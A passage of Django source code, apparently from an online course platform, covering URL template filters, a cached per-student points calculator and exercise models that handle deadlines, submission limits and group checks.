kwargs = instance.get_url_kwargs()\n    kwargs.update({\n        \"model\": model_name,\n    })\n    kwargs.update(extra_kwargs)\n    return kwargs\n\n\n@register.filter\ndef editurl(model_object, model_name):\n    return reverse('model-edit', kwargs=_normal_kwargs(\n        model_object.course_instance,\n        model_name,\n        id=model_object.id,\n    ))\n\n\n@register.filter\ndef removeurl(model_object, model_name):\n    return reverse('model-remove', kwargs=_normal_kwargs(\n        model_object.course_instance,\n        model_name,\n        id=model_object.id,\n    ))\n\n\n@register.filter\ndef createurl(model_object, model_name):\n    type_name = None\n    if \",\" in model_name:\n        model_name, type_name = model_name.split(\",\", 1)\n    if isinstance(model_object, CourseInstance):\n        return reverse('model-create', kwargs=_normal_kwargs(\n            model_object,\n            model_name,\n        ))\n    if type_name:\n        return reverse('model-create-type-for', kwargs=_normal_kwargs(\n            model_object.course_instance,\n            model_name,\n            parent_id=model_object.id,\n            type=type_name,\n        ))\n    return reverse('model-create-for', kwargs=_normal_kwargs(\n        model_object.course_instance,\n        model_name,\n        parent_id=model_object.id,\n    ))\n/n/n/nexercise/cache/points.py/n/nfrom copy import deepcopy\nfrom django.db.models.signals import post_save, post_delete, m2m_changed\nfrom django.utils import timezone\n\nfrom lib.cache import CachedAbstract\nfrom notification.models import Notification\nfrom ..models import LearningObject, Submission\nfrom .hierarchy import ContentMixin\n\n\nclass CachedPoints(ContentMixin, CachedAbstract):\n    KEY_PREFIX = 'points'\n\n    def __init__(self, course_instance, user, content):\n        self.content = content\n        self.instance = course_instance\n        self.user = user\n        super().__init__(course_instance, user)\n\n    def _needs_generation(self, data):\n        return data is None or data['created'] < self.content.created()\n\n    def _generate_data(self, instance, user, data=None):\n        data = deepcopy(self.content.data)\n        module_index = data['module_index']\n        exercise_index = data['exercise_index']\n        modules = data['modules']\n        categories = data['categories']\n        total = data['total']\n\n        # Augment submission parameters.\n        def r_augment(children):\n            for entry in children:\n                if entry['submittable']:\n                    entry.update({\n                        'submission_count': 0,\n                        'submissions': [],\n                        'best_submission': None,\n                        'points': 0,\n                        'passed': entry['points_to_pass'] == 0,\n                        'graded': False,\n                        'unofficial': False,\n                    })\n                r_augment(entry.get('children'))\n        for module in modules:\n            module.update({\n                'submission_count': 0,\n                'points': 0,\n                'points_by_difficulty': {},\n                'unconfirmed_points_by_difficulty': {},\n                'passed': module['points_to_pass'] == 0,\n            })\n            r_augment(module['children'])\n        for entry in categories.values():\n            entry.update({\n                'submission_count': 0,\n                'points': 0,\n                'points_by_difficulty': {},\n                'unconfirmed_points_by_difficulty': {},\n                'passed': entry['points_to_pass'] == 0,\n            })\n        total.update({\n            'submission_count': 0,\n            'points': 0,\n            'points_by_difficulty': {},\n            'unconfirmed_points_by_difficulty': {},\n        })\n\n        # Augment submission data.\n        if user.is_authenticated:\n            submissions = (\n                user.userprofile.submissions.exclude_errors()\n                .filter(exercise__course_module__course_instance=instance)\n                .prefetch_related('exercise')\n                .only('id', 'exercise', 'submission_time', 'status', 'grade')\n            )\n            for submission in submissions:\n                try:\n                    tree = self._by_idx(modules, exercise_index[submission.exercise.id])\n                except KeyError:\n                    self.dirty = True\n                    continue\n                entry = tree[-1]\n                entry['submission_count'] += 1 if not submission.status in (Submission.STATUS.ERROR, Submission.STATUS.UNOFFICIAL) else 0\n                unofficial = submission.status == Submission.STATUS.UNOFFICIAL\n                entry['submissions'].append({\n                    'id': submission.id,\n                    'max_points': entry['max_points'],\n                    'points_to_pass': entry['points_to_pass'],\n                    'confirm_the_level': entry.get('confirm_the_level', False),\n                    'submission_count': 1, # to fool points badge\n                    'points': submission.grade,\n                    'graded': submission.is_graded,\n                    'passed': submission.grade >= entry['points_to_pass'],\n                    'submission_status': submission.status if not submission.is_graded else False,\n                    'unofficial': unofficial,\n                    'date': submission.submission_time,\n                    'url': submission.get_url('submission-plain'),\n                })\n                if (\n                    submission.status == Submission.STATUS.READY and (\n                        entry['unofficial']\n                        or submission.grade >= entry['points']\n                    )\n                ) or (\n                    unofficial and (\n                        not entry['graded']\n                        or (entry['unofficial'] and submission.grade > entry['points'])\n                    )\n                ):\n                    entry.update({\n                        'best_submission': submission.id,\n                        'points': submission.grade,\n                        'passed': not unofficial and submission.grade >= entry['points_to_pass'],\n                        'graded': submission.status == Submission.STATUS.READY,\n                        'unofficial': unofficial,\n                    })\n                if submission.notifications.count() > 0:\n                    entry['notified'] = True\n                    if submission.notifications.filter(seen=False).count() > 0:\n                        entry['unseen'] = True\n\n        # Confirm points.\n        def r_check(parent, children):\n            for entry in children:\n                if (\n                    entry['submittable']\n                    and entry['confirm_the_level']\n                    and entry['passed']\n                ):\n                    if 'unconfirmed' in parent:\n                        del(parent['unconfirmed'])\n                    for child in parent.get('children', []):\n                        if 'unconfirmed' in child:\n                            del(child['unconfirmed'])\n                r_check(entry, entry.get('children', []))\n        for module in modules:\n            r_check(module, module['children'])\n\n        # Collect points and check limits.\n        def add_to(target, entry):\n            target['submission_count'] += entry['submission_count']\n            if entry.get('unofficial', False):\n                pass\n            elif entry.get('unconfirmed', False):\n                self._add_by_difficulty(\n                    target['unconfirmed_points_by_difficulty'],\n                    entry['difficulty'],\n                    entry['points']\n                )\n            else:\n                target['points'] += entry['points']\n                self._add_by_difficulty(\n                    target['points_by_difficulty'],\n                    entry['difficulty'],\n                    entry['points']\n                )\n        def r_collect(module, parent, children):\n            passed = True\n            max_points = 0\n            submissions = 0\n            points = 0\n            confirm_entry = None\n            for entry in children:\n                if entry['submittable']:\n                    if entry['confirm_the_level']:\n                        confirm_entry = entry\n                    else:\n                        passed = passed and entry['passed']\n                        max_points += entry['max_points']\n                        submissions += entry['submission_count']\n                        if entry['graded']:\n                            points += entry['points']\n                            add_to(module, entry)\n                            add_to(categories[entry['category_id']], entry)\n                            add_to(total, entry)\n                passed = (\n                    r_collect(module, entry, entry.get('children', []))\n                    and passed\n                )\n            if confirm_entry and submissions > 0:\n                confirm_entry['confirmable_points'] = True\n            if parent and not parent['submittable']:\n                parent['max_points'] = max_points\n                parent['submission_count'] = submissions\n                parent['points'] = points\n            return passed\n        for module in modules:\n            passed = r_collect(module, None, module['children'])\n            module['passed'] = (\n                passed\n                and module['points'] >= module['points_to_pass']\n            )\n        for category in categories.values():\n            category['passed'] = (\n                category['points'] >= category['points_to_pass']\n            )\n\n        data['points_created'] = timezone.now()\n        return data\n\n    def created(self):\n        return self.data['points_created'], super().created()\n\n    def submission_ids(self, number=None, category_id=None, module_id=None,\n                       exercise_id=None, filter_for_assistant=False, best=True):\n        exercises = self.search_exercises(\n            number=number,\n            category_id=category_id,\n            module_id=module_id,\n            exercise_id=exercise_id,\n            filter_for_assistant=filter_for_assistant,\n        )\n        submissions = []\n        if best:\n            for entry in exercises:\n                sid = entry.get('best_submission', None)\n                if not sid is None:\n                    submissions.append(sid)\n        else:\n            for entry in exercises:\n                submissions.extend(s['id'] for s in entry.get('submissions', []))\n        return submissions\n\n\ndef invalidate_content(sender, instance, **kwargs):\n    course = instance.exercise.course_instance\n    for profile in instance.submitters.all():\n        CachedPoints.invalidate(course, profile.user)\n\ndef invalidate_content_m2m(sender, instance, action, reverse, model, pk_set, **kwargs):\n    # many-to-many field Submission.submitters may be modified without\n    # triggering the Submission post save hook\n    if action not in ('post_add', 'pre_remove'):\n        return\n    if reverse:\n        # instance is a UserProfile\n        if model == Submission:\n            seen_courses = set()\n            for submission_pk in pk_set:\n                try:\n                    submission = Submission.objects.get(pk=submission_pk)\n                    course_instance = submission.exercise.course_instance\n                    if course_instance.pk not in seen_courses:\n                        CachedPoints.invalidate(course_instance, instance.user)\n                    else:\n                        seen_courses.add(course_instance.pk)\n                except Submission.DoesNotExist:\n                    pass\n    else:\n        # instance is a Submission\n        invalidate_content(Submission, instance)\n\ndef invalidate_notification(sender, instance, **kwargs):\n    course = instance.course_instance\n    if not course and instance.submission:\n        course = instance.submission.exercise.course_instance\n    CachedPoints.invalidate(course, instance.recipient.user)\n\n\n# Automatically invalidate cached points when submissions change.\npost_save.connect(invalidate_content, sender=Submission)\npost_delete.connect(invalidate_content, sender=Submission)\npost_save.connect(invalidate_notification, sender=Notification)\npost_delete.connect(invalidate_notification, sender=Notification)\n# listen to the m2m_changed signal since submission.submitters is a many-to-many\n# field and instances must be saved before the many-to-many fields may be modified,\n# that is to say, the submission post save hook may see an empty submitters list\nm2m_changed.connect(invalidate_content_m2m, sender=Submission.submitters.through)\n/n/n/nexercise/exercise_models.py/n/nimport datetime\nfrom urllib.parse import urlsplit\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.core.exceptions import ValidationError, PermissionDenied\nfrom django.core.files.storage import default_storage\nfrom django.urls import reverse\nfrom django.db import models\nfrom django.db.models import signals\nfrom django.db.models.signals import post_delete, post_save\nfrom django.template import loader, Context\nfrom django.utils import timezone\nfrom django.utils.formats import date_format\nfrom django.utils.translation import get_language, ugettext_lazy as _\n\nfrom aplus.api import api_reverse\nfrom course.models import StudentGroup, CourseInstance, CourseModule, LearningObjectCategory\nfrom external_services.lti import CustomStudentInfoLTIRequest\nfrom external_services.models import LTIService\nfrom inheritance.models import ModelWithInheritance\nfrom lib.api.authentication import (\n    get_graderauth_submission_params,\n    get_graderauth_exercise_params,\n)\nfrom lib.fields import JSONField\nfrom lib.helpers import (\n    Enum,\n    update_url_params,\n    safe_file_name,\n    roman_numeral,\n)\nfrom lib.models import UrlMixin\nfrom lib.localization_syntax import pick_localized\nfrom lib.validators import generate_url_key_validator\nfrom userprofile.models import UserProfile\n\nfrom .cache.exercise import ExerciseCache\nfrom .protocol.aplus import load_exercise_page, load_feedback_page\nfrom .protocol.exercise_page import ExercisePage\n\n\nclass LearningObjectManager(models.Manager):\n\n    def get_queryset(self):\n        return super().get_queryset()\\\n            .defer('description')\\\n            .select_related('course_module', 'course_module__course_instance',\n                'course_module__course_instance__course', 'category')\n\n    def find_enrollment_exercise(self, course_instance, profile):\n        exercise = None\n        if profile.is_external:\n            exercise = self.filter(\n                course_module__course_instance=course_instance,\n                status='enrollment_ext'\n            ).first()\n        return exercise or self.filter(\n            course_module__course_instance=course_instance,\n            status='enrollment'\n        ).first()\n\n\nclass LearningObject(UrlMixin, ModelWithInheritance):\n    \"\"\"\n    All learning objects inherit this model.\n    \"\"\"\n    STATUS = Enum([\n        ('READY', 'ready', _(\"Ready\")),\n        ('UNLISTED', 'unlisted', _(\"Unlisted in table of contents\")),\n        ('ENROLLMENT', 'enrollment', _(\"Enrollment questions\")),\n        ('ENROLLMENT_EXTERNAL', 'enrollment_ext', _(\"Enrollment questions for external students\")),\n        ('HIDDEN', 'hidden', _(\"Hidden from non course staff\")),\n        ('MAINTENANCE', 'maintenance', _(\"Maintenance\")),\n    ])\n    AUDIENCE = Enum([\n        ('COURSE_AUDIENCE', 0, _('Course audience')),\n        ('INTERNAL_USERS', 1, _('Only internal users')),\n        ('EXTERNAL_USERS', 2, _('Only external users')),\n        ('REGISTERED_USERS', 3, _('Only registered users')),\n    ])\n    status = models.CharField(max_length=32,\n        choices=STATUS.choices, default=STATUS.READY)\n    audience = models.IntegerField(choices=AUDIENCE.choices,\n        default=AUDIENCE.COURSE_AUDIENCE)\n    category = models.ForeignKey(LearningObjectCategory, on_delete=models.CASCADE,\n            related_name=\"learning_objects\")\n    course_module = models.ForeignKey(CourseModule, on_delete=models.CASCADE,\n            related_name=\"learning_objects\")\n    parent = models.ForeignKey('self', on_delete=models.SET_NULL,\n        blank=True, null=True, related_name='children')\n    order = models.IntegerField(default=1)\n    url = models.CharField(max_length=255,\n        validators=[generate_url_key_validator()],\n        help_text=_(\"Input an URL identifier for this object.\"))\n    name = models.CharField(max_length=255)\n    description = models.TextField(blank=True,\n        help_text=_(\"Internal description is not presented on site.\"))\n    use_wide_column = models.BooleanField(default=False,\n        help_text=_(\"Remove the third info column for more space.\"))\n\n    service_url = models.CharField(max_length=255, blank=True)\n    exercise_info = JSONField(blank=True)\n    model_answers = models.TextField(blank=True,\n        help_text=_(\"List model answer files as protected URL addresses.\"))\n    templates = models.TextField(blank=True,\n        help_text=_(\"List template files as protected URL addresses.\"))\n\n    # Keep this to support ExerciseWithAttachment\n    # Maybe this should inject extra content to any exercise\n    content = models.TextField(blank=True)\n\n    objects = LearningObjectManager()\n\n    class Meta:\n        app_label = \"exercise\"\n        ordering = ['course_module', 'order', 'id']\n        unique_together = ['course_module', 'parent', 'url']\n\n    def clean(self):\n        \"\"\"\n        Validates the model before saving (standard method used in Django admin).\n        \"\"\"\n        super().clean()\n        errors = {}\n        RESERVED = (\"submissions\", \"plain\", \"info\")\n        if self.url in RESERVED:\n            errors['url'] = _(\"Taken words include: {}\").format(\", \".join(RESERVED))\n        if self.course_module.course_instance != self.category.course_instance:\n            errors['category'] = _('Course_module and category must belong to the same course instance.')\n        if self.parent:\n            if self.parent.course_module != self.course_module:\n                errors['parent'] = _('Cannot select parent from another course module.')\n            if self.parent.id == self.id:\n                errors['parent'] = _('Cannot select self as a parent.')\n        if errors:\n            raise ValidationError(errors)\n\n    def save(self, *args, **kwargs):\n        super().save(*args, **kwargs)\n        # Trigger LearningObject post save signal for extending classes.\n        cls = self.__class__\n        while cls.__bases__:\n            cls = cls.__bases__[0]\n            if cls.__name__ == 'LearningObject':\n                signals.post_save.send(sender=cls, instance=self)\n\n    def delete(self, *args, **kwargs):\n        super().delete(*args, **kwargs)\n        # Trigger LearningObject post delete signal for extending classes.\n        cls = self.__class__\n        while cls.__bases__:\n            cls = cls.__bases__[0]\n            if cls.__name__ == 'LearningObject':\n                signals.post_delete.send(sender=cls, instance=self)\n\n    def __str__(self):\n        if self.order >= 0:\n            if self.course_instance.content_numbering == CourseInstance.CONTENT_NUMBERING.ARABIC:\n                number = self.number()\n                if self.course_instance.module_numbering in (\n                        CourseInstance.CONTENT_NUMBERING.ARABIC,\n                        CourseInstance.CONTENT_NUMBERING.HIDDEN,\n                    ):\n                    return \"{:d}.{} {}\".format(self.course_module.order, number, self.name)\n                return \"{} {}\".format(number, self.name)\n            elif self.course_instance.content_numbering == CourseInstance.CONTENT_NUMBERING.ROMAN:\n                return \"{} {}\".format(roman_numeral(self.order), self.name)\n        return self.name\n\n    def number(self):\n        return \".\".join([str(o.order) for o in self.parent_list()])\n\n    def parent_list(self):\n        if not hasattr(self, '_parents'):\n            def recursion(obj, parents):\n                if not obj is None:\n                    return recursion(obj.parent, [obj] + parents)\n                return parents\n            self._parents = recursion(self.parent, [self])\n        return self._parents\n\n    @property\n    def course_instance(self):\n        return self.course_module.course_instance\n\n    @property\n    def is_submittable(self):\n        return False\n\n    def is_empty(self):\n        return not self.service_url and self.as_leaf_class()._is_empty()\n\n    def _is_empty(self):\n        return True\n\n    def is_open(self, when=None):\n        return self.course_module.is_open(when=when)\n\n    def is_after_open(self, when=None):\n        return self.course_module.is_after_open(when=when)\n\n    def is_closed(self, when=None):\n        return self.course_module.is_closed(when=when)\n\n    @property\n    def can_show_model_solutions(self):\n        \"\"\"Can model solutions be shown to students?\n        This method checks only the module deadline and ignores personal\n        deadline extensions.\n        \"\"\"\n        return self.is_closed() and not self.course_instance.is_on_lifesupport() and not self.course_instance.is_archived()\n\n    def can_show_model_solutions_to_student(self, student):\n        \"\"\"Can model solutions be shown to the given student (User)?\n        This method checks personal deadline extensions in addition to\n        the common module deadline.\n        \"\"\"\n        # The old version of this method was defined in this LearningObject class\n        # even though only exercises could be submitted to and have model solutions.\n        # Class BaseExercise overrides this method since deadline deviations are\n        # defined only for them, not learning objects.\n        return student.is_authenticated and self.can_show_model_solutions\n\n    def get_path(self):\n        return \"/\".join([o.url for o in self.parent_list()])\n\n    ABSOLUTE_URL_NAME = \"exercise\"\n\n    def get_url_kwargs(self):\n        return dict(exercise_path=self.get_path(), **self.course_module.get_url_kwargs())\n\n    def get_display_url(self):\n        if self.status == self.STATUS.UNLISTED and self.parent:\n            return \"{}#chapter-exercise-{:d}\".format(\n                self.parent_list()[-2].get_absolute_url(),\n                self.order\n            )\n        return self.get_absolute_url()\n\n    def get_submission_list_url(self):\n        return self.get_url(\"submission-list\")\n\n    def load(self, request, students, url_name=\"exercise\"):\n        \"\"\"\n        Loads the learning object page.\n        \"\"\"\n        page = ExercisePage(self)\n        if not self.service_url:\n            return page\n        language = get_language()\n        cache = ExerciseCache(self, language, request, students, url_name)\n        page.head = cache.head()\n        page.content = cache.content()\n        page.is_loaded = True\n        return page\n\n    def load_page(self, language, request, students, url_name, last_modified=None):\n        return load_exercise_page(\n            request,\n            self.get_load_url(language, request, students, url_name),\n            last_modified,\n            self\n        )\n\n    def get_load_url(self, language, request, students, url_name=\"exercise\"):\n        return update_url_params(pick_localized(self.service_url, language), {\n            'lang': language,\n        })\n\n    def get_models(self):\n        entries = pick_localized(self.model_answers, get_language())\n        return [(url,url.split('/')[-1]) for url in entries.split()]\n\n    def get_templates(self):\n        entries = pick_localized(self.templates, get_language())\n        return [(url,url.split('/')[-1]) for url in entries.split()]\n\n\ndef invalidate_exercise(sender, instance, **kwargs):\n    for language,_ in settings.LANGUAGES:\n        ExerciseCache.invalidate(instance, modifiers=[language])\n\n\n# Automatically invalidate cached exercise html when edited.\npost_save.connect(invalidate_exercise, sender=LearningObject)\npost_delete.connect(invalidate_exercise, sender=LearningObject)\n\n\nclass LearningObjectDisplay(models.Model):\n    \"\"\"\n    Records views of learning objects.\n    \"\"\"\n    learning_object = models.ForeignKey(LearningObject, on_delete=models.CASCADE)\n    profile = models.ForeignKey(UserProfile, on_delete=models.CASCADE)\n    timestamp = models.DateTimeField(auto_now_add=True)\n\n\nclass CourseChapter(LearningObject):\n    \"\"\"\n    Chapters can offer and organize learning material as one page chapters.\n    \"\"\"\n    generate_table_of_contents = models.BooleanField(default=False)\n\n    objects = models.Manager()\n\n    def _is_empty(self):\n        return not self.generate_table_of_contents\n\n\nclass BaseExercise(LearningObject):\n    \"\"\"\n    The common parts for all exercises.\n    \"\"\"\n    # Timing enumeration is only used as a return value.\n    TIMING = Enum([\n        ('CLOSED_BEFORE', 0, \"Submissions are not yet accepted\"),\n        ('OPEN', 1, \"Normal submissions are accepted\"),\n        ('LATE', 2, \"Late submissions are accepted\"),\n        ('UNOFFICIAL', 3, \"Only unofficial submissions are accepted\"),\n        ('CLOSED_AFTER', 4, \"Submissions are not anymore accepted\"),\n        ('ARCHIVED', 5, \"Course is archived and so are exercises\"),\n    ])\n\n    SUBMIT_STATUS = Enum([\n        ('ALLOWED', 1, ''),\n        ('CANNOT_ENROLL', 2, 'You cannot enroll in the course.'),\n        ('NOT_ENROLLED', 3, 'You must enroll at course home.'),\n        ('INVALID_GROUP', 4, 'The selected group is not acceptable.'),\n        ('AMOUNT_EXCEEDED', 5, 'You have used the allowed amount of submissions.'),\n        ('INVALID', 999, 'You cannot submit for an unspecified reason.'),\n    ])\n\n    allow_assistant_viewing = models.BooleanField(default=True)\n    allow_assistant_grading = models.BooleanField(default=False)\n    min_group_size = models.PositiveIntegerField(default=1)\n    max_group_size = models.PositiveIntegerField(default=1)\n    max_submissions = models.PositiveIntegerField(default=10)\n    max_points = models.PositiveIntegerField(default=100)\n    points_to_pass = models.PositiveIntegerField(default=40)\n    difficulty = models.CharField(max_length=32, blank=True)\n\n    objects = models.Manager()\n\n    class Meta:\n        app_label = 'exercise'\n\n    def clean(self):\n        \"\"\"\n        Validates the model before saving (standard method used in Django admin).\n        \"\"\"\n        super().clean()\n        errors = {}\n        if self.points_to_pass > self.max_points:\n            errors['points_to_pass'] = _(\"Points to pass cannot be greater than max_points.\")\n        if self.min_group_size > self.max_group_size:\n            errors['min_group_size'] = _(\"Minimum group size cannot exceed maximum size.\")\n        if errors:\n            raise ValidationError(errors)\n\n    @property\n    def is_submittable(self):\n        return True\n\n    def get_timing(self, students, when):\n        module = self.course_module\n        # Check the course instance archive time first so that submissions\n        # are never accepted after it.\n        dl = module.course_instance.archive_start\n        if module.course_instance.is_archived(when=when):\n            return self.TIMING.ARCHIVED, dl\n\n        if not module.is_after_open(when=when):\n            return self.TIMING.CLOSED_BEFORE, module.opening_time\n\n        category = self.category\n        if module.is_open(when=when) or category.confirm_the_level:\n            return self.TIMING.OPEN, module.closing_time\n\n        deviation = self.one_has_deadline_deviation(students)\n        dl = deviation.get_new_deadline() if deviation else None\n        if dl and when <= dl:\n            if deviation.without_late_penalty:\n                return self.TIMING.OPEN, dl\n            return self.TIMING.LATE, dl\n\n        if module.is_late_submission_open(when=when):\n            return self.TIMING.LATE, module.late_submission_deadline\n\n        dl = dl or (module.late_submission_deadline\n            if module.late_submissions_allowed else module.closing_time)\n        if category.accept_unofficial_submits:\n            return self.TIMING.UNOFFICIAL, dl\n\n        return self.TIMING.CLOSED_AFTER, dl\n\n    def delta_in_minutes_from_closing_to_date(self, future_date):\n        module_close = self.course_module.closing_time\n        # module_close is in utc format 2018-04-10 23:59:00+00:00\n        # while future_date from the teacher submitted form might\n        # be in different formet, eg. 2018-05-15 23:59:00+03:00\n        # -> convert future_date to same format as module_close\n        string_date = str(future_date)[:16]\n        converted = timezone.make_aware(\n                datetime.datetime.strptime(string_date, '%Y-%m-%d %H:%M'),\n                timezone.get_current_timezone())\n        delta = converted - module_close\n        return delta.days * 24 * 60 + delta.seconds // 60\n\n    def one_has_access(self, students, when=None):\n        \"\"\"\n        Checks if any of the users can submit taking the granted extra time\n        in consideration.\n        \"\"\"\n        timing,d = self.get_timing(students, when or timezone.now())\n        if timing == self.TIMING.OPEN:\n            return True,[]\n        if timing == self.TIMING.LATE:\n            # xgettext:no-python-format\n            return True,[_(\"Deadline for the exercise has passed. Late submissions are allowed until {date} but points are only worth {percent:d}% of normal.\").format(\n                date=date_format(d),\n                percent=self.course_module.get_late_submission_point_worth(),\n            )]\n        if timing == self.TIMING.UNOFFICIAL:\n            return True,[_(\"Deadline for the exercise has passed ({date}). You may still submit to receive feedback, but your current grade will not change.\").format(\n                date=date_format(d)\n            )]\n        if timing == self.TIMING.CLOSED_BEFORE:\n            return False,[_(\"The exercise opens {date} for submissions.\").format(\n                date=date_format(d)\n            )]\n        if timing == self.TIMING.CLOSED_AFTER:\n            return False,[_(\"Deadline for the exercise has passed ({date}).\").format(\n                date=date_format(d)\n            )]\n        if timing == self.TIMING.ARCHIVED:\n            return False,[_(\"This course has been archived ({date}).\").format(\n                date=date_format(d)\n            )]\n        return False,[\"ERROR\"]\n\n    def one_has_deadline_deviation(self, students):\n        deviation = None\n        for profile in students:\n            for d in self.deadlineruledeviation_set.filter(submitter=profile):\n                if not deviation\\\n                        or d.get_new_deadline() > deviation.get_new_deadline():\n                    deviation = d\n        return deviation\n\n    def number_of_submitters(self):\n        return self.course_instance.students\\\n            .filter(submissions__exercise=self).distinct().count()\n\n    def get_submissions_for_student(self, user_profile, exclude_errors=False):\n        if exclude_errors:\n            submissions = user_profile.submissions.exclude_errors()\n        else:\n            submissions = user_profile.submissions\n        return submissions.filter(exercise=self)\n\n    def max_submissions_for_student(self, user_profile):\n        \"\"\"\n        Calculates student specific max_submissions considering the possible\n        MaxSubmissionsRuleDeviation for this student.\n        \"\"\"\n        deviation = self.maxsubmissionsruledeviation_set \\\n            .filter(submitter=user_profile).first()\n        if deviation:\n            return self.max_submissions + deviation.extra_submissions\n        return self.max_submissions\n\n    def one_has_submissions(self, students):\n        if self.max_submissions == 0:\n            return True, []\n        submission_count = 0\n        for profile in students:\n            # The students are in the same group, therefore, each student should\n            # have the same submission count. However, max submission deviation\n            # may be set for only one group member.\n            submission_count = self.get_submissions_for_student(profile, True).count()\n            if submission_count < self.max_submissions_for_student(profile):\n                return True, []\n        max_unofficial_submissions = settings.MAX_UNOFFICIAL_SUBMISSIONS\n        if self.category.accept_unofficial_submits and \\\n                (max_unofficial_submissions == 0 or submission_count < max_unofficial_submissions):\n            # Note: time is not checked here, but unofficial submissions are\n            # not allowed if the course archive time has passed.\n            # The caller must check the time limits too.\n            return True, [_('You have used the allowed amount of submissions for this exercise. You may still submit to receive feedback, but your current grade will not change.')]\n        return False, [_('You have used the allowed amount of submissions for this exercise.')]\n\n    def no_submissions_left(self, students):\n        if self.max_submissions == 0:\n            return False\n        for profile in students:\n            if self.get_submissions_for_student(profile, True).count() \\\n                    <= self.max_submissions_for_student(profile):\n                return False\n        return True\n\n    def check_submission_allowed(self, profile, request=None):\n        \"\"\"\n        Checks whether the submission to this exercise is allowed for the given\n        user and generates a list of warnings.\n\n        @return: (success_flag, warning_message_list)\n        \"\"\"\n        success, warnings, students = self._check_submission_allowed(profile, request)\n        return success, list(str(w) for w in warnings), students\n\n    def _check_submission_allowed(self, profile, request=None):\n        students = [profile]\n        warnings = []\n\n        # Let course module settings decide submissionable state.\n        #if self.course_instance.ending_time < timezone.now():\n        #    warnings.append(_('The course is archived. Exercises are offline.'))\n        #    return False, warnings, students\n\n        # Check enrollment requirements.\n        enrollment = self.course_instance.get_enrollment_for(profile.user)\n        if self.status in (\n            LearningObject.STATUS.ENROLLMENT,\n            LearningObject.STATUS.ENROLLMENT_EXTERNAL,\n        ):\n            if not self.course_instance.is_enrollment_open():\n                return (self.SUBMIT_STATUS.CANNOT_ENROLL,\n                        [_('The enrollment is not open.')],\n                        students)\n            if not self.course_instance.is_enrollable(profile.user):\n                return (self.SUBMIT_STATUS.CANNOT_ENROLL,\n                        [_('You cannot enroll in the course.')],\n                        students)\n        elif not enrollment:\n            if self.course_instance.is_course_staff(profile.user):\n                return (self.SUBMIT_STATUS.ALLOWED,\n                        [_('Staff can submit exercises without enrolling.')],\n                        students)\n            return (self.SUBMIT_STATUS.NOT_ENROLLED,\n                    [_('You must enroll in the course to submit exercises.')],\n                    students)\n\n        # Support group id from post or currently selected group.\n        group = None\n        group_id = request.POST.get(\"_aplus_group\") if request else None\n        if not group_id is None:\n            try:\n                gid = int(group_id)\n                if gid > 0:\n                    group = profile.groups.filter(\n                        course_instance=self.course_instance,\n                        id=gid).first()\n            except ValueError:\n                pass\n        elif enrollment and enrollment.selected_group:\n            group = enrollment.selected_group\n\n        # Check groups cannot be changed after submitting.\n        submission = self.get_submissions_for_student(profile).first()\n        if submission:\n            if self._detect_group_changes(profile, group, submission):\n                msg = _(\"Group can only change between different exercises.\")\n                warning = _('You have previously submitted this '\n                            'exercise {with_group}. {msg}')\n                if submission.submitters.count() == 1:\n                    warning = warning.format(with_group=_('alone'), msg=msg)\n                else:\n                    collaborators = StudentGroup.format_collaborator_names(\n                            submission.submitters.all(), profile)\n                    with_group = _('with {}').format(collaborators)\n                    warning = warning.format(with_group=with_group, msg=msg)\n                warnings.append(warning)\n                return self.SUBMIT_STATUS.INVALID_GROUP, warnings, students\n\n        elif self._detect_submissions(profile, group):\n            warnings.append(_('{collaborators} already submitted to this exercise in a different group.').format(\n                collaborators=group.collaborator_names(profile)))\n            return self.SUBMIT_STATUS.INVALID_GROUP, warnings, students\n\n        # Get submitters.\n        if group:\n            students = list(group.members.all())\n\n        # Check group size.\n        if not (self.min_group_size <= len(students) <= self.max_group_size):\n            if self.max_group_size == self.min_group_size:\n                size = \"{:d}\".format(self.min_group_size)\n            else:\n                size = \"{:d}-{:d}\".format(self.min_group_size, self.max_group_size)\n            warnings.append(\n                _(\"This exercise must be submitted in groups of {size} students.\")\n                .format(size=size))\n\n        access_ok,access_warnings = self.one_has_access(students)\n        is_staff = all(self.course_instance.is_course_staff(p.user) for p in students)\n        ok = (access_ok and len(warnings) == 0) or is_staff\n        all_warnings = warnings + access_warnings\n        if not ok:\n            if len(all_warnings) == 0:\n                all_warnings.append(_(\n                    'Cannot submit exercise due to unknown reason. If you '\n                    'think this is an error, please contact course staff.'))\n            return self.SUBMIT_STATUS.INVALID, all_warnings, students\n\n        submit_limit_ok, submit_limit_warnings = self.one_has_submissions(students)\n        if not submit_limit_ok and not is_staff:\n            # access_warnings are not needed here\n            return (self.SUBMIT_STATUS.AMOUNT_EXCEEDED,\n                    submit_limit_warnings,\n                    students)\n\n        return self.SUBMIT_STATUS.ALLOWED, all_warnings + submit_limit_warnings, students\n\n    def _detect_group_changes(self, profile, group, submission):\n        submitters = list(submission.submitters.all())\n        if group:\n            return not group.equals(submitters)\n        else:\n            return len(submitters) > 1 or submitters[0] != profile\n\n    def _detect_submissions(self, profile, group):\n        if group:\n            return not all((\n                len(self.get_submissions_for_student(p)) == 0\n                for p in group.members.all() if p != profile\n            ))\n        return False\n\n    def get_total_submitter_count(self):\n        return UserProfile.objects \\\n            .filter(submissions__exercise=self) \\\n            .distinct().count()\n\n    def get_load_url(self, language, request, students, url_name=\"exercise\"):\n        if self.id:\n            if request.user.is_authenticated:\n                user = request.user\n                submission_count = self.get_submissions_for_student(user.userprofile).count()\n            else:\n                user = None\n                submission_count = 0\n            # Make grader async URL for the currently authenticated user.\n            # The async handler will handle group selection at submission time.\n            submission_url = update_url_params(\n                api_reverse(\"exercise-grader\", kwargs={\n                    'exercise_id': self.id\n                }),\n                get_graderauth_exercise_params(self, user),\n            )\n            return self._build_service_url(\n                language, request, students,\n                submission_count + 1, url_name, submission_url\n            )\n        return super().get_load_url(language, request, students, url_name)\n\n    def grade(self, request, submission, no_penalties=False, url_name=\"exercise\"):\n        \"\"\"\n        Loads the exercise feedback page.\n        \"\"\"\n        language = get_language()\n        submission_url = update_url_params(\n            api_reverse(\"submission-grader\", kwargs={\n                'submission_id': submission.id\n            }),\n            get_graderauth_submission_params(submission),\n        )\n        url = self._build_service_url(\n            language, request, submission.submitters.all(),\n            submission.ordinal_number(), url_name, submission_url\n        )\n        return load_feedback_page(\n            request, url, self, submission, no_penalties=no_penalties\n        )\n\n    def modify_post_parameters(self, data, files, user, students, request, url):\n        \"\"\"\n        Allows to modify submission POST parameters before they are sent to\n        the grader. Extending classes may implement this function.\n        \"\"\"\n        pass\n\n    def _build_service_url(self, language, request, students, ordinal_number, 